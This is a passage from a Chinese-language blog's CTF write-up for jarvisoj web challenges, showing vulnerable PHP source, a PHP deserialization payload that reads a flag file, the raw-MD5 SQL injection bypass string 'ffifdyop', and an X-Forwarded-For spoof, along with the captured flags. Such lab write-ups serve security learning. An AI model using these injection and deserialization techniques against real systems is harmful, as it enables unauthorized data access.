+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$f = $_GET[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">		$f = base64_decode($f);</span><br><span class="line">		<span class="keyword">if</span> (stripos($f,<span class="string">&#x27;..&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; stripos($f,<span class="string">&#x27;/&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; stripos($f,<span class="string">&#x27;\\&#x27;</span>)===<span class="literal">FALSE</span></span><br><span class="line">		&amp;&amp; stripos($f,<span class="string">&#x27;pctf&#x27;</span>)===<span class="literal">FALSE</span>) &#123;</span><br><span class="line">			readfile($f);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;File not found!&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>shield.php:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//flag is in pctf.php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $file;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filename = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">readfile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">&#x27;..&#x27;</span>)===<span class="literal">FALSE</span>  </span><br><span class="line">			&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">&#x27;/&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">&#x27;\\&#x27;</span>)==<span class="literal">FALSE</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以知道flag在<code>pctf.php</code>中，但过滤了pctf，不能直接包含<code>pctf.php</code></p>
+<p><strong>构造反序列化序列：</strong></p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20191210223726.png"></p>
+<p>payload:</p>
+<pre><code>index.php?class=O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</code></pre>
+<p>查看源码得到flag</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20191210224319.png"></p>
+<h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>打开题目网址：</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805145436.png"></p>
+<p>好像没什么思路啊，抓包看看吧</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805145633.png"></p>
+<p>看到响应头中有个提示</p>
+<pre><code>&quot;select * from `admin` where password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot;</code></pre>
+<p><strong>md5()函数</strong>有两个参数</p>
+<p>参数一是要加密的字符串；</p>
+<p>参数二是输出格式：为true时，表示输出原始16字符二进制格式；<br>默认为false，表示输出32字符十六进制数。</p>
+<p>看到提示第一时间想到注入,可是如何闭合sql语句呢？如果找到一个字符串MD5加密后得到的原始二进制格式在SQL中拼接成 类似 ‘or’xxx的形式就可以绕过了</p>
+<p>将<code>ffifdyop</code>提交flag就出来了</p>
+<pre><code>PCTF&#123;R4w_md5_is_d4ng3rous&#125;</code></pre>
+<h2 id="LOCALHOST-1"><a href="#LOCALHOST-1" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p>打开题目网址：</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805144450.png"></p>
+<p>仅本机访问，立刻想到抓包改XFF</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805144941.png"></p>
+<p>flag就这样出来了，是不是很简单？就是这样简单</p>
+<pre><code>PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125;</code></pre>
+<h2 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h2><p>打开题目网址可以发现：</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805141505.png"></p>
+<p>它让我们用51端口访问这个网址</p>
+<p>看其他大佬的wp用的是curl命令，打开虚拟机咱也试下吧</p>
+<pre><code>curl –local-port http://web.jarvisoj.com:32770/</code></pre>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805143017.png"></p>
+<p>神魔情况？又看了看几位大佬的博客，说是必须要用公网IP的主机才行。不太死心，又试了试cmd里的，果然还是不行。</p>
+<p>查看了众多大佬的博客后得出的原因好像是：本地私有地址从代理服务器出去后，使用的是代理服务器的端口，这个端口往往不会是51，我用的是校园网，虚拟机也是经过主机走的校园网，所以。。。。</p>
+<p>没办法只能抄别人的flag了</p>
+<pre><code>PCTF&#123;M45t3r_oF_CuRl&#125;    </code></pre>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.m00nback.xyz/2019/10/05/jarvisoj-web-wp/>http://www.m00nback.xyz/2019/10/05/jarvisoj-web-wp/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-04-23T17:15:50+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2020年4月23日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/writeup/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>writeup</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/web/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>web</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ctf/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ctf</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/jarvisoj/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>jarvisoj</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.m00nback.xyz/2019/10/05/jarvisoj-web-wp/&title=jarvisoj web部分writeup - 明月归的小站&summary=本篇博客介绍了jarvisOJ上web部分题writeup！！！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.m00nback.xyz/2019/10/05/jarvisoj-web-wp/&title=jarvisoj web部分writeup - 明月归的小站&summary=本篇博客介绍了jarvisOJ上web部分题writeup！！！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.m00nback.xyz/2019/10/05/jarvisoj-web-wp/&title=jarvisoj web部分writeup - 明月归的小站&summary=本篇博客介绍了jarvisOJ上web部分题writeup！！！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2019/10/16/mysql-injection/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>Mysql注入方法</p>
+                <p class='content'>本篇博客主要介绍了mysql注入的一些方法！
+
+
+可以回显sql错误的注入联合查询必了解的东西：
+
+数据库information_schema用来存储其他数据库的信息，包括所有的数据库名称，表名...</p>
+              </a>
+            
+            
+              <a class='next' href='/2019/10/01/bugku-web-partquestion/'>
+                <p class='title'>bugku web部分题目writeup<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>本篇博客介绍了bugku中web部分题的writeup,感觉这些题自己收获还挺多的，包括以下题目：
+
+cookies欺骗
+welcome to bugkuctf
+
+
+
+cookies欺骗打开题目...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#61dctf-babyphp"><span class="toc-text">[61dctf]babyphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#61dctf-admin"><span class="toc-text">[61dctf]admin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LOCALHOST"><span class="toc-text">LOCALHOST</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E6%89%8B%E9%87%8C"><span class="toc-text">flag在管理员手里</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHPINFO"><span class="toc-text">PHPINFO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#api%E8%B0%83%E7%94%A8"><span class="toc-text">api调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-Gallery"><span class="toc-text">Easy Gallery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IN-A-Mess"><span class="toc-text">IN A Mess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-text">神盾局的秘密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Login"><span class="toc-text">Login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LOCALHOST-1"><span class="toc-text">LOCALHOST</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PORT51"><span class="toc-text">PORT51</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
